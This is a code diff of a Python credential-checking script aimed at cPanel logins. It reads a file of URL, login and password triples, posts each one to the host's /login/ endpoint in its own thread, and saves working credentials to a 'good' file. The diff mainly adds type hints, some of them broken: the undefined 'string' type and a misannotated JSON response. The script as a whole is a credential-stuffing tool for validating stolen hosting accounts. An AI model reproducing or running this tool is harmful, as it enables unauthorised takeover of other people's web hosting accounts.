@@ -8,10 +8,10 @@ from json.decoder import JSONDecodeError
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-accounts_list = open("accounts.txt", "r").read().splitlines()            
+accounts_list: list = open("accounts.txt", "r").read().splitlines()            
 
-def check(url, login, password):
-    headers = {
+def check(url: string, login: string, password: string) -> None:
+    headers: dict = {
         'Accept': '*/*',
         'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
         'Connection': 'keep-alive',
@@ -25,37 +25,36 @@ def check(url, login, password):
         'sec-ch-ua-platform': '"Windows"',
     }
 
-    params = {
+    params: dict = {
         'login_only': '1',
     }
 
-    data = {
+    data: dict = {
         'user': login,
         'pass': password,
     }
-
+    
     try:
-        try:
-            response = requests.post('{}/login/'.format(url), params = params, headers = headers, data = data, timeout = 3, verify = False).json()
-            if response['status'] == 1:
-                print('Valid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
-                with open("./results/good.txt", "a") as f:
-                    f.write('{}|{}|{} \n'.format(url, login, password))
-            else: 
-                print('Invalid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
-                with open("./results/bad.txt", "a") as f:
-                    f.write('{}|{}|{} \n'.format(url, login, password))
-        except JSONDecodeError as e:
-            print('Bad format: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
-            with open("./results/no_check.txt", "a") as f:
+        response: requests.Response = requests.post('{}/login/'.format(url), params = params, headers = headers, data = data, timeout = 3, verify = False).json()
+        if response['status'] == 1:
+            print('Valid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
+            with open("./results/good.txt", "a") as f:
                 f.write('{}|{}|{} \n'.format(url, login, password))
+        else: 
+            print('Invalid: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
+            with open("./results/bad.txt", "a") as f:
+                f.write('{}|{}|{} \n'.format(url, login, password))
+    except JSONDecodeError as e:
+        print('Bad format: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
+        with open("./results/no_check.txt", "a") as f:
+            f.write('{}|{}|{} \n'.format(url, login, password))
     except requests.Timeout as err:
         print('Bad request: URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
         with open("./results/bad_request.txt", "a") as f:
             f.write('{}|{}|{} \n'.format(url, login, password))
 
 
-def test_connect(domain: str, port: int):
+def test_connect(domain: str, port: int) -> bool:
     try:
         with socket.create_connection((domain, port)) as s:
             return True
@@ -63,22 +62,21 @@ def test_connect(domain: str, port: int):
         pass
     return False
 
-def check_thread(url_test, url, port, login, password):
+def check_thread(url_test: string, url: string, port: int, login: string, password: string) -> None:
     if test_connect(url_test, port):
-        check(url, login, password)
-    else: 
-        print('Not working! URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
-        with open("./results/notwork_url.txt", "a") as f:
-            f.write('{}|{}|{} \n'.format(url, login, password))
+        return check(url, login, password)
+    print('Not working! URL: {} | Login: {} | Password: {} \n'.format(url, login, password))
+    with open("./results/notwork_url.txt", "a") as f:
+        f.write('{}|{}|{} \n'.format(url, login, password))
         
-account_count = 0 
-musorka = 0 
+account_count: int = 0 
+trashes: int = 0 
 
 for account in accounts_list:
-    account = account.split('|')
-    os.system("title Accounts {} / Checked: {} / Musor: {}".format(len(accounts_list) - 1, account_count, musorka))
-    url = re.search('(.+)cpsess', account[0])
-    port = re.search('://(.+):(\d+)/', account[0])
+    account: list = account.split('|')
+    os.system("title Accounts {} / Checked: {} / Musor: {}".format(len(accounts_list) - 1, account_count, trashes))
+    url: list = re.search('(.+)cpsess', account[0])
+    port: list = re.search('://(.+):(\d+)/', account[0])
     if url:
         if port:
             th = threading.Thread(target = check_thread, args=(port.group(1), url.group(1), port.group(2), account[1], account[2])).start()
